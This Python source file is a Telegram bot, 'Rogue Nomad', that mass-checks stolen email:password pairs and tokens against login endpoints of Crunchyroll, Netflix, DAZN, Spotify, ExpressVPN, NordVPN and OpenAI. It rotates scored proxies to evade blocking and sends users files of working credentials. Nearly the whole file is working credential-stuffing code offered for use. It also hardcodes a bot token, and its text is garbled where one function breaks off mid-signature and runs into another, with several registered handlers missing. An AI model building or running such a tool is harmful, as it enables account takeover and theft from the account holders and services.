#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROGUE NOMAD - Premium Checker Bot
Created for Butter | https://t.me/+ckfO94UHyhllODg0
Bot: @roguenomad_bot
Admin: 1875307475
"""

import os
import asyncio
import logging
import json
import re
import io
import random
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
from contextlib import asynccontextmanager

# ============================================
# TELEGRAM IMPORTS
# ============================================
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ContextTypes
)
from telegram.constants import ParseMode

# ============================================
# EXTERNAL LIBRARIES
# ============================================
import aiohttp
import aiosqlite

# ============================================
# CONFIGURATION - YOUR CREDENTIALS
# ============================================
BOT_TOKEN = "8279300523:AAGC71G8Dd9QmmF2Yhn6MUSTKq7i-4q6p7w"
ADMIN_ID = 1875307475
DATABASE_URL = "rogue_nomad.db"
LOG_LEVEL = "INFO"
BOT_LINK = "https://t.me/+ckfO94UHyhllODg0"
BOT_USERNAME = "@roguenomad_bot"
BOT_NAME = "Rogue Nomad"
BOT_VERSION = "v3.0"

# ============================================
# LOGGING SETUP
# ============================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=getattr(logging, LOG_LEVEL)
)
logger = logging.getLogger(__name__)

# ============================================
# DATABASE LAYER - PERSISTENT STORAGE
# ============================================
INIT_DB = """
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    proxy TEXT UNIQUE NOT NULL,
    score INTEGER DEFAULT 100,
    failures INTEGER DEFAULT 0,
    alive BOOLEAN DEFAULT 1,
    last_used TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    chat_id INTEGER NOT NULL,
    service TEXT NOT NULL,
    credential TEXT NOT NULL,
    valid BOOLEAN DEFAULT 0,
    status TEXT,
    data TEXT,
    proxy_used TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS user_stats (
    user_id INTEGER PRIMARY KEY,
    total_checks INTEGER DEFAULT 0,
    total_valid INTEGER DEFAULT 0,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS global_stats (
    id INTEGER PRIMARY KEY,
    service TEXT NOT NULL,
    total INTEGER DEFAULT 0,
    valid INTEGER DEFAULT 0,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_checks_user ON checks(user_id);
CREATE INDEX IF NOT EXISTS idx_checks_service ON checks(service);
CREATE INDEX IF NOT EXISTS idx_checks_created ON checks(created_at);
CREATE INDEX IF NOT EXISTS idx_proxy_alive ON proxies(alive);
CREATE INDEX IF NOT EXISTS idx_proxy_score ON proxies(score);
"""

@asynccontextmanager
async def get_db():
    """Database connection context manager."""
    async with aiosqlite.connect(DATABASE_URL) as db:
        await db.execute(INIT_DB)
        await db.commit()
        yield db

# ============================================
# PROXY MANAGER
# ============================================
class ProxyManager:
    """Manages proxy rotation with persistence and scoring."""
    
    def __init__(self):
        self._cache = []
        self._cache_time = 0
        self._cache_ttl = 60
    
    async def get_working_proxies(self) -> List[str]:
        """Get list of working proxies from database with caching."""
        if time.time() - self._cache_time < self._cache_ttl and self._cache:
            return self._cache
        
        async with get_db() as db:
            cursor = await db.execute(
                "SELECT proxy FROM proxies WHERE alive = 1 ORDER BY score DESC LIMIT 500"
            )
            rows = await cursor.fetchall()
            self._cache = [row[0] for row in rows]
            self._cache_time = time.time()
            return self._cache
    
    async def get_proxy(self) -> Optional[str]:
        """Get a random working proxy."""
        proxies = await self.get_working_proxies()
        if not proxies:
            return None
        return random.choice(proxies)
    
    async def add_proxy(self, proxy: str) -> bool:
        """Add a single proxy to the database."""
        proxy = proxy.replace("http://", "").replace("https://", "").strip()
        if not proxy or ":" not in proxy:
            return False
        
        parts = proxy.split(":")
        if len(parts) not in [2, 4]:
            return False
        
        try:
            async with get_db() as db:
                await db.execute(
                    "INSERT OR IGNORE INTO proxies (proxy) VALUES (?)",
                    (proxy,)
                )
                await db.commit()
                self._cache = []
                return True
        except Exception as e:
            logger.error(f"Error adding proxy {proxy}: {e}")
            return False
    
    async def add_proxies_from_text(self, content: str) -> int:
        """Add multiple proxies from text content."""
        added = 0
        for line in content.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                if await self.add_proxy(line):
                    added += 1
        return added
    
    async def report_result(self, proxy: str, success: bool):
        """Update proxy score based on check result."""
        if not proxy:
            return
        
        async with get_db() as db:
            if success:
                await db.execute(
                    "UPDATE proxies SET score = MIN(100, score + 5), failures = 0 WHERE proxy = ?",
                    (proxy,)
                )
            else:
                await db.execute(
                    "UPDATE proxies SET score = MAX(0, score - 10), failures = failures + 1 WHERE proxy = ?",
                    (proxy,)
                )
                await db.execute(
                    "UPDATE proxies SET alive = 0 WHERE proxy = ? AND failures >= 3",
                    (proxy,)
                )
            await db.commit()
            self._cache = []
    
    async def get_stats(self) -> Dict:
        """Get proxy statistics."""
        async with get_db() as db:
            total = await db.execute_fetchall("SELECT COUNT(*) FROM proxies")
            alive = await db.execute_fetchall("SELECT COUNT(*) FROM proxies WHERE alive = 1")
            return {
                "total": total[0][0] if total else 0,
                "alive": alive[0][0] if alive else 0
            }
    
    async def clear_dead_proxies(self) -> int:
        """Remove all dead proxies from database."""
        async with get_db() as db:
            cursor = await db.execute("DELETE FROM proxies WHERE alive = 0")
            await db.commit()
            removed = cursor.rowcount
            self._cache = []
            return removed

# ============================================
# SERVICE CHECKERS
# ============================================
class ServiceCheckers:
    """Contains all service-specific checkers."""
    
    @staticmethod
    async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    "https://www.crunchyroll.com/",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    html = await resp.text()
                    csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
                    csrf = csrf_match.group(1) if csrf_match else ""
                
                async with session.post(
                    "https://www.crunchyroll.com/login",
                    data={"email": email, "password": password, "csrf_token": csrf},
                    proxy=proxy,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 302:
                        return {"valid": True, "status": "active", "tier": "premium"}
                    return {"valid": False, "status": "invalid"}
        except Exception as e:
            return {"valid": False, "status": "error", "error": str(e)}
    
    @staticmethod
    async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {token}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                async with session.get(
                    "https://www.netflix.com/api/shakti/viper/metadata",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "expired"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://login.dazn.com/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}"}
                async with session.get(
                    "https://api.openai.com/v1/models",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active", "tier": "paid"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://www.expressvpn.com/api/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://api.nordvpn.com/v1/users/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_spotify(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://accounts.spotify.com/api/v1/login",
                    data={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}

# ============================================
# CHECKER ENGINE
# ============================================
class CheckerEngine:
    """Orchestrates all check operations."""
    
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.services = {
            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type": "token", "label": "📺 Netflix"},
            "dazn": {"checker": ServiceCheckers.check_dazn, "type": "email:pass", "label": "⚽ DAZN"},
            "openai": {"checker": ServiceCheckers.check_openai_token, "type": "token", "label": "🧠 OpenAI"},
            "expressvpn": {"checker": ServiceCheckers.check_expressvpn, "type": "email:pass", "label": "🔒 ExpressVPN"},
            "nordvpn": {"checker": ServiceCheckers.check_nordvpn, "type": "email:pass", "label": "🔐 NordVPN"},
            "spotify": {"checker": ServiceCheckers.check_spotify, "type": "email:pass", "label": "🎵 Spotify"}
        }
        self.semaphore = asyncio.Semaphore(30)
        self.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
    
    def _parse_credential(self, cred: str) -> Dict:
        cred = cred.strip()
        if ":" in cred and "@" in cred:
            parts = cred.split(":", 1)
            return {"email": parts[0].strip(), "password": parts[1].strip()}
        elif cred.startswith("ey") or len(cred) > 30:
            return {"token": cred}
        else:
            return {"raw": cred}
    
    async def check_single(self, service: str, credential: str, use_proxy: bool = True, user_id: int = 0, chat_id: int = 0) -> Dict:
        async with self.semaphore:
            proxy = await self.proxy_manager.get_proxy() if use_proxy else None
            service_info = self.services.get(service)
            if not service_info:
                return {"valid": False, "status": "unknown_service"}
            
            checker = service_info["checker"]
            parsed = self._parse_credential(credential)
            
            try:
                result = await checker(**parsed, proxy=proxy)
                if proxy:
                    await self.proxy_manager.report_result(proxy, result.get("valid", False))
                self._update_stats(service, result.get("valid", False))
                await self._log_check(user_id, chat_id, service, credential[:50], result.get("valid", False), result.get("status", "unknown"), json.dumps(result), proxy)
                result["proxy_used"] = proxy
                return result
            except Exception as e:
                self.stats["errors"] += 1
                await self._log_check(user_id, chat_id, service, credential[:50], False, "error", json.dumps({"error": str(e)}), proxy)
                return {"valid": False, "status": "error", "error": str(e)}
    
    async def check_batch(self, service: str, credentials: List[str], use_proxy: bool = True, user_id: int = 0, chat_id: int = 0, max_workers: int = 20) -> List[Dict]:
        sem = asyncio.Semaphore(max_workers)
        async def limited_check(cred):
            async with sem:
                return await self.check_single(service, cred, use_proxy, user_id, chat_id)
        
        tasks = [limited_check(cred) for cred in credentials]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for r in results:
            if isinstance(r, Exception):
                processed.append({"valid": False, "status": "error", "error": str(r)})
            else:
                processed.append(r)
        return processed
    
    async def _log_check(self, user_id, chat_id, service, credential, valid, status, data, proxy):
        try:
            async with get_db() as db:
                await db.execute(
                    "INSERT INTO checks (user_id, chat_id, service, credential, valid, status, data, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_id, chat_id, service, credential, valid, status, data, proxy or "")
                )
                await db.execute(
                    "INSERT OR REPLACE INTO users (user_id) VALUES (?)",
                    (user_id,)
                )
                await db.commit()
        except Exception as e:
            logger.error(f"Failed to log check: {e}")
    
    def _update_stats(self, service: str, valid: bool):
        self.stats["total"] += 1
        if valid:
            self.stats["valid"] += 1
        else:
            self.stats["invalid"] += 1
        if service not in self.stats["by_service"]:
            self.stats["by_service"][service] = {"total": 0, "valid": 0}
        self.stats["by_service"][service]["total"] += 1
        if valid:
            self.stats["by_service"][service]["valid"] += 1
    
    def get_stats(self) -> Dict:
        return self.stats

# ============================================
# TELEGRAM BOT - INITIALIZE
# ============================================
proxy_manager = ProxyManager()
checker_engine = CheckerEngine(proxy_manager)

SERVICE_CATEGORIES = {
    "📺 Streaming": {
        "crunchyroll": "🍿 Crunchyroll",
        "netflix": "📺 Netflix",
        "dazn": "⚽ DAZN",
        "spotify": "🎵 Spotify",
    },
    "🔒 VPN / Proxy": {
        "expressvpn": "🔒 ExpressVPN",
        "nordvpn": "🔐 NordVPN",
    },
    "🧠 AI": {
        "openai": "🧠 OpenAI",
    }
}

# ============================================
# ADMIN HELPER FUNCTIONS
# ============================================
async def is_admin(user_id: int) -> bool:
    """Check if a user is the admin."""
    return user_id == ADMIN_ID

async def register_user(user_id: int, username: str = None, first_name: str = None):
    """Register or update user in database."""
    try:
        async with get_db() as db:
            await db.execute(
                "INSERT OR REPLACE INTO users (user_id, username, first_name, last_active) VALUES (?, ?, ?, CURRENT_TIMESTAMP)",
                (user_id, username or "", first_name or "")
            )
            await db.commit()
    except Exception as e:
        logger.error(f"Failed to register user: {e}")

# ============================================
# COMMAND HANDLERS
# ============================================

async def start_command(update: Update, async def proxy_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy statistics."""
    query = update.callback_query
    await query.answer()
    
    stats = await proxy_manager.get_stats()
    proxies = await proxy_manager.get_working_proxies()
    sample = "\n".join([f"• {p}" for p in proxies[:5]]) if proxies else "No proxies available"
    
    await query.edit_message_text(
        f"🌐 *Proxy Statistics*\n\n"
        f"Total: `{stats['total']}`\n"
        f"Working: `{stats['alive']}`\n\n"
        f"*Sample working proxies:*\n{sample}\n\n"
        f"{'... and ' + str(len(proxies) - 5) + ' more' if len(proxies) > 5 else ''}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="proxy")]
        ])
    )

async def proxy_clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear dead proxies."""
    query = update.callback_query
    await query.answer()
    
    removed = await proxy_manager.clear_dead_proxies()
    
    await query.edit_message_text(
        f"🗑️ *Dead Proxies Cleared*\n\n"
        f"Removed `{removed}` dead proxies from the database.\n"
        f"Working proxies: `{len(await proxy_manager.get_working_proxies())}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="proxy")]
        ])
    )

async def admin_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin full statistics."""
    query = update.callback_query
    await query.answer()
    
    if not await is_admin(update.effective_user.id):
        await query.edit_message_text("❌ Unauthorized.")
        return
    
    stats = checker_engine.get_stats()
    proxy_stats = await proxy_manager.get_stats()
    
    async with get_db() as db:
        users_cursor = await db.execute("SELECT COUNT(*) FROM users")
        users_count = (await users_cursor.fetchone())[0]
        checks_cursor = await db.execute("SELECT COUNT(*) FROM checks")
        checks_count = (await checks_cursor.fetchone())[0]
        valid_cursor = await db.execute("SELECT COUNT(*) FROM checks WHERE valid = 1")
        valid_count = (await valid_cursor.fetchone())[0]
    
    text = f"""
🔐 *Admin Full Statistics*

*Users:*
• Total Users: `{users_count}`

*Database:*
• Total Checks: `{checks_count}`
• Valid Checks: `{valid_count}`

*Memory Stats:*
• Total: `{stats['total']}`
• Valid: `{stats['valid']}`
• Invalid: `{stats['invalid']}`
• Errors: `{stats['errors']}`

*Proxies:*
• Total: `{proxy_stats['total']}`
• Working: `{proxy_stats['alive']}`

*By Service:*
"""
    for service, data in stats.get("by_service", {}).items():
        label = checker_engine.services.get(service, {}).get("label", service)
        text += f"• {label}: {data['valid']}/{data['total']}\n"
    
    await query.edit_message_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
        ])
    )

async def admin_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user list."""
    query = update.callback_query
    await query.answer()
    
    if not await is_admin(update.effective_user.id):
        await query.edit_message_text("❌ Unauthorized.")
        return
    
    async with get_db() as db:
        cursor = await db.execute(
            "SELECT user_id, username, first_name, joined_at, last_active FROM users ORDER BY joined_at DESC LIMIT 20"
        )
        users = await cursor.fetchall()
    
    if not users:
        await query.edit_message_text("📋 No users registered yet.")
        return
    
    text = "📋 *Recent Users (Last 20)*\n\n"
    for user in users:
        user_id, username, first_name, joined, active = user
        name = first_name or username or str(user_id)
        text += f"• {name} | `{user_id}`\n"
        text += f"  Joined: {joined[:16]}\n"
    
    await query.edit_message_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
        ])
    )

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin broadcast via callback."""
    query = update.callback_query
    await query.answer()
    
    if not await is_admin(update.effective_user.id):
        await query.edit_message_text("❌ Unauthorized.")
        return
    
    await query.edit_message_text(
        "📢 *Broadcast*\n\n"
        "Send a message to broadcast to all users.\n"
        "Usage: `/broadcast Your message here`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
        ])
    )

async def admin_reset_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin reset stats via callback."""
    query = update.callback_query
    await query.answer()
    
    if not await is_admin(update.effective_user.id):
        await query.edit_message_text("❌ Unauthorized.")
        return
    
    checker_engine.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
    
    async with get_db() as db:
        await db.execute("DELETE FROM checks")
        await db.execute("DELETE FROM user_stats")
        await db.execute("DELETE FROM global_stats")
        await db.commit()
    
    await query.edit_message_text(
        "✅ *Statistics Reset*\n\nAll statistics have been cleared.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
        ])
    )

async def back_to_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Go back to start menu."""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 Start Checking", callback_data="checkers")],
        [InlineKeyboardButton("📊 Statistics", callback_data="show_stats")],
        [InlineKeyboardButton("🔗 Join Community", url=BOT_LINK)]
    ]
    
    await query.edit_message_text(
        f"🔥 *{BOT_NAME} {BOT_VERSION}*\n\n"
        f"Welcome back! What would you like to do?",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def back_to_checkers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Go back to checkers menu."""
    query = update.callback_query
    await query.answer()
    await checkers_command(update, context)

async def back_to_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Go back to proxy menu."""
    query = update.callback_query
    await query.answer()
    await proxy_command(update, context)

async def back_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Go back to admin panel."""
    query = update.callback_query
    await query.answer()
    await admin_command(update, context)

# ============================================
# MESSAGE HANDLERS - PROCESS CREDENTIALS
# ============================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages and file uploads."""
    if not context.user_data.get("waiting_for_creds"):
        # Check if it's a proxy upload
        if update.message.text and update.message.text.startswith("proxy:"):
            await handle_proxy_upload(update, context)
            return
        return
    
    service = context.user_data.get("check_service")
    if not service:
        await update.message.reply_text("❌ No service selected. Use /checkers first.")
        return
    
    # Get credentials
    if update.message.document:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        credentials = content.decode("utf-8").strip().split("\n")
        await update.message.reply_text(f"📄 Loaded {len(credentials)} credentials from file.")
    else:
        text = update.message.text.strip()
        if text.startswith("proxy:"):
            await handle_proxy_upload(update, context)
            return
        credentials = text.split("\n")
    
    # Filter and clean
    credentials = [c.strip() for c in credentials if c.strip()]
    if not credentials:
        await update.message.reply_text("❌ No credentials provided.")
        return
    
    # Send initial status
    status_msg = await update.message.reply_text(
        f"⏳ Checking {len(credentials)} credentials on *{service}*...\n"
        f"This may take a moment.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Run checks
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    use_proxy = context.user_data.get("use_proxy", True)
    
    results = await checker_engine.check_batch(
        service=service,
        credentials=credentials,
        use_proxy=use_proxy,
        user_id=user_id,
        chat_id=chat_id,
        max_workers=20
    )
    
    # Separate valid/invalid
    valid = [r for r in results if r.get("valid")]
    invalid = [r for r in results if not r.get("valid")]
    
    # Create output file for valid credentials
    if valid:
        output_lines = []
        for i, r in enumerate(valid):
            cred = credentials[i] if i < len(credentials) else "unknown"
            status = r.get("status", "active")
            tier = r.get("tier", r.get("plan", r.get("region", "N/A")))
            output_lines.append(f"{cred} | {status} | {tier}")
        
        output = "\n".join(output_lines)
        output_file = io.StringIO(output)
        output_file.name = f"valid_{service}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        await update.message.reply_document(
            document=output_file,
            filename=output_file.name,
            caption=f"✅ {len(valid)} valid credentials found."
        )
    
    # Summary
    summary = f"""
📊 *Check Complete*

Service: `{service}`
Total: `{len(results)}`
✅ Valid: `{len(valid)}`
❌ Invalid: `{len(invalid)}`
🌐 Proxy: `{'Enabled' if use_proxy else 'Disabled'}`
⏱️ Time: `{datetime.now().strftime('%H:%M:%S')}`
"""
    await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN)
    await status_msg.delete()
    context.user_data["waiting_for_creds"] = False

async def handle_proxy_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle proxy file upload or text input."""
    text = update.message.text.strip() if update.message.text else ""
    content = ""
    
    if update.message.document:
        file = await update.message.document.get_file()
        data = await file.download_as_bytearray()
        content = data.decode("utf-8")
    elif text.startswith("proxy:"):
        content = text.replace("proxy:", "").strip()
    else:
        # Try adding as single proxy
        if ":" in text:
            count = await proxy_manager.add_proxies_from_text(text)
            await update.message.reply_text(f"✅ Added {count} proxy to the pool.")
            return
        return
    
    count = await proxy_manager.add_proxies_from_text(content)
    working = len(await proxy_manager.get_working_proxies())
    
    await update.message.reply_text(
        f"✅ *Proxy Import Complete*\n\n"
        f"Added: `{count}` proxies\n"
        f"Working: `{working}` proxies\n"
        f"Use /proxy to manage them.",
        parse_mode=ParseMode.MARKDOWN
    )

# ============================================
# MAIN APPLICATION
# ============================================

def main():
    """Start the Rogue Nomad bot."""
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ BOT_TOKEN not set! Check your configuration.")
        return
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # ============================================
    # COMMAND HANDLERS
    # ============================================
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("about", about_command))
    app.add_handler(CommandHandler("checkers", checkers_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("proxy", proxy_command))
    app.add_handler(CommandHandler("stopcheck", stop_check_command))
    
    # Admin commands
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("resetstats", reset_stats_command))
    
    # ============================================
    # CALLBACK QUERY HANDLERS
    # ============================================
    # Category and service selection
    app.add_handler(CallbackQueryHandler(handle_category, pattern="^cat_"))
    app.add_handler(CallbackQueryHandler(handle_service_selection, pattern="^svc_"))
    app.add_handler(CallbackQueryHandler(toggle_proxy_callback, pattern="^toggle_proxy"))
    
    # Stats and proxy callbacks
    app.add_handler(CallbackQueryHandler(show_stats_callback, pattern="^show_stats"))
    app.add_handler(CallbackQueryHandler(proxy_stats_callback, pattern="^proxy_stats"))
    app.add_handler(CallbackQueryHandler(proxy_clear_callback, pattern="^proxy_clear"))
    
    # Admin callbacks
    app.add_handler(CallbackQueryHandler(admin_stats_callback, pattern="^admin_stats"))
    app.add_handler(CallbackQueryHandler(admin_users_callback, pattern="^admin_users"))
    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast"))
    app.add_handler(CallbackQueryHandler(admin_reset_callback, pattern="^admin_reset"))
    
    # Navigation callbacks
    app.add_handler(CallbackQueryHandler(back_to_start, pattern="^back_start"))
    app.add_handler(CallbackQueryHandler(back_to_checkers, pattern="^checkers$"))
    app.add_handler(CallbackQueryHandler(back_to_proxy, pattern="^proxy$"))
    app.add_handler(CallbackQueryHandler(back_to_admin, pattern="^admin$"))
    
    # Group support
    app.add_handler(CallbackQueryHandler(handle_group_join, pattern="^join_group$"))
    
    # ============================================
    # MESSAGE HANDLERS
    # ============================================
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    
    # ============================================
    # START THE BOT
    # ============================================
    logger.info(f"🚀 {BOT_NAME} {BOT_VERSION} is LIVE!")
    logger.info(f"📱 Bot: {BOT_USERNAME}")
    logger.info(f"🔗 Channel: {BOT_LINK}")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    logger.info("=" * 50)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
